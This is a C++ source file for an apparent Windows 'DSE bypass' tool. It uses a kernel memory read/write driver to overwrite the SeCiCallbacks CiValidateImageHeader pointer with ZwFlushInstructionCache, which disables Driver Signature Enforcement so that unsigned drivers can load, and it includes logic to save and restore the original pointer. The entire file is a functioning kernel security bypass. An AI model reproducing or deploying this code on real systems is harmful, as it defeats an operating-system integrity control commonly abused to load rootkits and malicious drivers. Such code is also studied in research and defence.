// DSEBypassNG.cpp
// Next-Generation DSE Bypass using SeCiCallbacks manipulation
// Always calculates fresh offsets on each run to handle KASLR properly
// Author: Marek Wesolowski, 2025

#include "DSEBypassNG.h"
#include "common.h"
#include <psapi.h>
#include <shlwapi.h>

static constexpr DWORD64 CALLBACK_OFFSET = 0x20;

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shlwapi.lib")

// ============================================================================
// CONSTRUCTION
// ============================================================================

DSEBypassNG::DSEBypassNG(std::unique_ptr<kvc>& driver) 
    : m_driver(driver) 
{
    DEBUG(L"[DSE-NG] Initialized");
}

// ============================================================================
// PUBLIC INTERFACE
// ============================================================================

bool DSEBypassNG::DisableDSE() noexcept {
    INFO(L"[DSE-NG] Starting Next-Gen DSE Bypass (Safe Mode)...");
    
    // Get current LCUVersion for logging only
    std::wstring currentLCUVer = GetCurrentLCUVersion();
    if (!currentLCUVer.empty()) {
        INFO(L"[DSE-NG] Current LCUVersion: %s", currentLCUVer.c_str());
    }
    
    // Get current kernel base (changes every reboot due to KASLR)
    auto kernelInfo = GetKernelInfo();
    if (!kernelInfo) {
        ERROR(L"[DSE-NG] Failed to get kernel information");
        return false;
    }
    
    auto [kernelBase, kernelPath] = *kernelInfo;
    INFO(L"[DSE-NG] Current Kernel Base: 0x%llX", kernelBase);
    
    // Get symbol offsets from local PDB or download
    INFO(L"[DSE-NG] Resolving symbols from PDB...");
    auto offsets = m_symbolEngine.GetSymbolOffsets(kernelPath);
    if (!offsets) {
        ERROR(L"[DSE-NG] Failed to get symbol offsets");
        return false;
    }
    
    auto [offSeCi, offZwFlush] = *offsets;
    
    // Validate offsets
    if (!ValidateOffsets(offSeCi, offZwFlush, kernelBase)) {
        ERROR(L"[DSE-NG] Offset validation failed");
        return false;
    }
    
    // Calculate addresses using current kernel base
    DWORD64 seciBase = kernelBase + offSeCi;
    DWORD64 targetAddress = seciBase + CALLBACK_OFFSET;
    DWORD64 safeFunction = kernelBase + offZwFlush;
    
    DEBUG(L"[DSE-NG] Kernel base: 0x%llX", kernelBase);
    DEBUG(L"[DSE-NG] SeCi offset: 0x%llX", offSeCi);
    DEBUG(L"[DSE-NG] ZwFlush offset: 0x%llX", offZwFlush);
    DEBUG(L"[DSE-NG] SeCiCallbacks base: 0x%llX", seciBase);
    DEBUG(L"[DSE-NG] Target address: 0x%llX", targetAddress);
    DEBUG(L"[DSE-NG] Safe function: 0x%llX", safeFunction);
    
    // Read current callback value
    auto current = m_driver->Read64(targetAddress);
    if (!current) {
        ERROR(L"[DSE-NG] Failed to read current kernel callback at 0x%llX", targetAddress);
        ERROR(L"[DSE-NG] Possible causes: Invalid address, driver not loaded, or memory protected");
        return false;
    }
    
    DEBUG(L"[DSE-NG] Current callback value: 0x%llX", *current);
    
    // Check if already patched
    if (*current == safeFunction) {
        // Already patched - check if we have original saved
        auto savedOriginal = SessionManager::GetOriginalCiCallback();
        if (savedOriginal == 0) {
            // Save the current value (which is the patched value)
            SessionManager::SaveOriginalCiCallback(*current);
            DEBUG(L"[DSE-NG] Saved current callback (already patched): 0x%llX", *current);
        }
        
        SUCCESS(L"[DSE-NG] DSE is already disabled (Safe Mode)");
        SUCCESS(L"[DSE-NG] State: PATCHED (ZwFlush callback active)");
        return true;
    }
    
    // Validate kernel function pointer range
    if (*current < 0xFFFFF80000000000ULL) {
        ERROR(L"[DSE-NG] Current value doesn't appear to be a valid kernel function address");
        ERROR(L"[DSE-NG] Value: 0x%llX (expected ≥ 0xFFFFF80000000000)", *current);
        ERROR(L"[DSE-NG] Target address calculation may be incorrect");
        return false;
    }
    
    // Check if this matches a previously saved original
    auto savedOriginal = SessionManager::GetOriginalCiCallback();
    if (savedOriginal != 0 && *current == savedOriginal) {
        INFO(L"[DSE-NG] Current callback matches saved original");
        INFO(L"[DSE-NG] State: NORMAL (DSE enabled)");
        INFO(L"[DSE-NG] Proceeding with patch...");
    }
    
    // Save original callback before patching
    SessionManager::SaveOriginalCiCallback(*current);
    DEBUG(L"[DSE-NG] Saved original callback: 0x%llX", *current);
    
    // Apply patch
    return ApplyPatch(targetAddress, safeFunction, *current);
}

bool DSEBypassNG::RestoreDSE() noexcept {
    INFO(L"[DSE-NG] Restoring DSE configuration...");
    
    // Get current LCUVersion for logging
    std::wstring currentLCUVer = GetCurrentLCUVersion();
    if (!currentLCUVer.empty()) {
        INFO(L"[DSE-NG] Current LCUVersion: %s", currentLCUVer.c_str());
    }
    
    // Get current kernel base (changes every reboot due to KASLR)
    auto kernelInfo = GetKernelInfo();
    if (!kernelInfo) {
        ERROR(L"[DSE-NG] Failed to get kernel information");
        return false;
    }
    
    auto [kernelBase, kernelPath] = *kernelInfo;
    INFO(L"[DSE-NG] Current Kernel Base: 0x%llX", kernelBase);
    
    // Get symbol offsets
    INFO(L"[DSE-NG] Resolving symbols from PDB...");
    auto offsets = m_symbolEngine.GetSymbolOffsets(kernelPath);
    if (!offsets) {
        ERROR(L"[DSE-NG] Failed to get symbol offsets");
        return false;
    }
    
    auto [offSeCi, offZwFlush] = *offsets;
    
    // Calculate addresses
    DWORD64 targetAddress = kernelBase + offSeCi + CALLBACK_OFFSET;
    DWORD64 safeFunction = kernelBase + offZwFlush;
    
    // Check current state in kernel
    auto current = m_driver->Read64(targetAddress);
    if (!current) {
        ERROR(L"[DSE-NG] Failed to read kernel callback at 0x%llX", targetAddress);
        return false;
    }
    
    DEBUG(L"[DSE-NG] Current value at 0x%llX: 0x%llX", targetAddress, *current);
    DEBUG(L"[DSE-NG] Safe function (ZwFlush): 0x%llX", safeFunction);
    
    // Check if already patched (DSE disabled)
    if (*current == safeFunction) {
        // DSE is disabled - check if we have original callback
        auto original = SessionManager::GetOriginalCiCallback();
        if (original == 0) {
            ERROR(L"[DSE-NG] DSE is DISABLED (patched)");
            ERROR(L"[DSE-NG] No original callback saved - cannot restore");
            ERROR(L"[DSE-NG] State: PATCHED (restoration impossible)");
            return false;
        } else {
            INFO(L"[DSE-NG] DSE is DISABLED (patched)");
            INFO(L"[DSE-NG] Original callback available: 0x%llX", original);
            INFO(L"[DSE-NG] Proceeding with restoration...");
            // Continue to restoration below
        }
    }
    
    // Check if already restored (or never was patched)
    auto original = SessionManager::GetOriginalCiCallback();
    if (original != 0 && *current == original) {
        SUCCESS(L"[DSE-NG] DSE is already RESTORED");
        SUCCESS(L"[DSE-NG] Current callback matches saved original");
        SUCCESS(L"[DSE-NG] State: NORMAL (DSE enabled)");
        return true;
    }
    
    // If we don't have original and value is not safeFunction
    if (original == 0 && *current != safeFunction) {
        INFO(L"[DSE-NG] DSE appears to be in NORMAL state");
        INFO(L"[DSE-NG] No patch detected, no saved state");
        INFO(L"[DSE-NG] State: NORMAL (or unknown, no cache)");
        return true;
    }
    
    // If we don't have original and value IS safeFunction
    if (original == 0 && *current == safeFunction) {
        ERROR(L"[DSE-NG] DSE is DISABLED but no original callback saved");
        ERROR(L"[DSE-NG] State: PATCHED (cannot restore - no saved state)");
        return false;
    }
    
    // Normal restoration (have original, current != original)
    INFO(L"[DSE-NG] Current state: PATCHED");
    INFO(L"[DSE-NG] Current callback: 0x%llX (ZwFlush)", *current);
    INFO(L"[DSE-NG] Restoring to original: 0x%llX", original);
    
    if (RestorePatch(targetAddress, original)) {
        SUCCESS(L"[DSE-NG] DSE RESTORED successfully");
        SUCCESS(L"[DSE-NG] State changed: PATCHED -> NORMAL");
        // Keep original callback in registry for future use
        DEBUG(L"[DSE-NG] Original callback kept in registry for future operations");
        return true;
    }
    
    ERROR(L"[DSE-NG] Failed to restore kernel callback");
    return false;
}

bool DSEBypassNG::ClearSymbolCache() noexcept {
    INFO(L"[DSE-NG] Clearing saved state...");
    SessionManager::ClearOriginalCiCallback();
    SUCCESS(L"[DSE-NG] Saved state cleared");
    return true;
}

std::wstring DSEBypassNG::GetCacheStatus() noexcept {
    std::wstring status;
    std::wstring lcuVer = GetCurrentLCUVersion();
    
    if (lcuVer.empty()) {
        status = L"LCUVersion: Unknown";
    } else {
        status = L"LCUVersion: " + lcuVer;
    }
    
    // Check original callback
    auto original = SessionManager::GetOriginalCiCallback();
    if (original != 0) {
        status += L"\nOriginal callback saved: 0x" + std::to_wstring(original);
    } else {
        status += L"\nOriginal callback: Not saved";
    }
    
    return status;
}

DSEBypassNG::DSEState DSEBypassNG::CheckDSEState() noexcept {
    // Get current kernel info
    auto kernelInfo = GetKernelInfo();
    if (!kernelInfo) {
        return DSEState::UNKNOWN;
    }
    
    auto [kernelBase, kernelPath] = *kernelInfo;
    
    // Get offsets
    auto offsets = m_symbolEngine.GetSymbolOffsets(kernelPath);
    if (!offsets) {
        return DSEState::UNKNOWN;
    }
    
    auto [offSeCi, offZwFlush] = *offsets;
    
    DWORD64 targetAddress = kernelBase + offSeCi + CALLBACK_OFFSET;
    DWORD64 safeFunction = kernelBase + offZwFlush;
    
    auto current = m_driver->Read64(targetAddress);
    if (!current) {
        return DSEState::UNKNOWN;
    }
    
    if (*current == safeFunction) {
        return DSEState::PATCHED;
    }
    
    auto original = SessionManager::GetOriginalCiCallback();
    if (original != 0 && *current == original) {
        return DSEState::NORMAL;
    }
    
    return DSEState::CORRUPTED;
}

std::wstring DSEBypassNG::GetDSEStateString(DSEState state) {
    switch (state) {
        case DSEState::NORMAL:    return L"NORMAL (DSE enabled)";
        case DSEState::PATCHED:   return L"PATCHED (DSE disabled)";
        case DSEState::CORRUPTED: return L"CORRUPTED (unknown callback)";
        default:                  return L"UNKNOWN (no data)";
    }
}

// ============================================================================
// PRIVATE HELPERS
// ============================================================================

std::optional<std::pair<DWORD64, std::wstring>> DSEBypassNG::GetKernelInfo() noexcept {
    LPVOID drivers[1024];
    DWORD needed;
    
    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) {
        ERROR(L"[DSE-NG] Failed to enumerate device drivers: %d", GetLastError());
        return std::nullopt;
    }
    
    DWORD64 kernelBase = reinterpret_cast<DWORD64>(drivers[0]);
    
    wchar_t kernelPath[MAX_PATH];
    if (!GetDeviceDriverFileNameW(drivers[0], kernelPath, MAX_PATH)) {
        ERROR(L"[DSE-NG] Failed to get kernel path: %d", GetLastError());
        return std::nullopt;
    }
    
    // Convert NT path to DOS path
    std::wstring ntPath = kernelPath;
    std::wstring dosPath;
    
    if (ntPath.find(L"\\SystemRoot\\") == 0) {
        wchar_t winDir[MAX_PATH];
        GetWindowsDirectoryW(winDir, MAX_PATH);
        dosPath = std::wstring(winDir) + ntPath.substr(11);
    } else if (ntPath.find(L"\\??\\") == 0) {
        dosPath = ntPath.substr(4);
    } else {
        dosPath = ntPath;
    }
    
    DEBUG(L"[DSE-NG] Kernel base: 0x%llX, path: %s", kernelBase, dosPath.c_str());
    return std::make_pair(kernelBase, dosPath);
}

std::wstring DSEBypassNG::GetCurrentLCUVersion() noexcept {
    HKEY hKey;
    std::wstring lcuVer;
    
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, 
                      L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                      0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
        wchar_t buffer[256] = {0};
        DWORD size = sizeof(buffer);
        DWORD type = 0;
        
        if (RegQueryValueExW(hKey, L"LCUVer", nullptr, &type,
            reinterpret_cast<BYTE*>(buffer), &size) == ERROR_SUCCESS && 
            type == REG_SZ) {
            lcuVer = buffer;
        } else {
            DEBUG(L"[DSE-NG] LCUVer not found in registry");
        }
        RegCloseKey(hKey);
    }
    
    return lcuVer;
}

bool DSEBypassNG::ApplyPatch(DWORD64 targetAddress, DWORD64 safeFunction, DWORD64 originalCallback) noexcept {
    
    INFO(L"[DSE-NG] Patching CiValidateImageHeader callback");
    INFO(L"[DSE-NG] SeCiCallbacks base: 0x%llX", targetAddress - CALLBACK_OFFSET);
    INFO(L"[DSE-NG] Callback offset: +0x%llX", CALLBACK_OFFSET);
    INFO(L"[DSE-NG] Target address: 0x%llX", targetAddress);
    INFO(L"[DSE-NG] Original: 0x%llX", originalCallback);
    INFO(L"[DSE-NG] Patch to: 0x%llX (ZwFlushInstructionCache)", safeFunction);
    
    // Apply the patch
    if (m_driver->Write64(targetAddress, safeFunction)) {
        // Verify the patch
        auto verify = m_driver->Read64(targetAddress);
        if (verify && *verify == safeFunction) {
            SUCCESS(L"[DSE-NG] DSE disabled successfully via SeCiCallbacks");
            SUCCESS(L"[DSE-NG] Kernel callback redirected to ZwFlushInstructionCache");
            SUCCESS(L"[DSE-NG] State: NORMAL -> PATCHED");
            return true;
        } else {
            ERROR(L"[DSE-NG] Patch verification failed");
            // Try to restore original
            m_driver->Write64(targetAddress, originalCallback);
            return false;
        }
    }
    
    ERROR(L"[DSE-NG] Failed to write to kernel memory");
    return false;
}

bool DSEBypassNG::RestorePatch(DWORD64 targetAddress, DWORD64 originalCallback) noexcept {
    INFO(L"[DSE-NG] Restoring original kernel callback...");
    INFO(L"[DSE-NG] Target: 0x%llX", targetAddress);
    INFO(L"[DSE-NG] Restore value: 0x%llX", originalCallback);
    
    // Restore original
    if (m_driver->Write64(targetAddress, originalCallback)) {
        // Verify restoration
        auto verify = m_driver->Read64(targetAddress);
        if (verify && *verify == originalCallback) {
            SUCCESS(L"[DSE-NG] Kernel callback restored successfully");
            return true;
        } else {
            ERROR(L"[DSE-NG] Restoration verification failed");
            return false;
        }
    }
    
    ERROR(L"[DSE-NG] Failed to restore kernel callback");
    return false;
}

bool DSEBypassNG::ValidateOffsets(DWORD64 offSeCi, DWORD64 offZwFlush, DWORD64 kernelBase) noexcept {
    if (offSeCi == 0 || offZwFlush == 0) {
        ERROR(L"[DSE-NG] Invalid offsets (zero)");
        return false;
    }
    if (offSeCi > 0xFFFFFF || offZwFlush > 0xFFFFFF) {
        ERROR(L"[DSE-NG] Suspiciously large offsets");
        return false;
    }
    if (offSeCi >= offZwFlush) {
        INFO(L"[DSE-NG] SeCiCallbacks offset >= ZwFlush offset (unusual)");
    }
    
    DEBUG(L"[DSE-NG] Offsets validated: SeCi=0x%llX, ZwFlush=0x%llX", offSeCi, offZwFlush);
    return true;
}
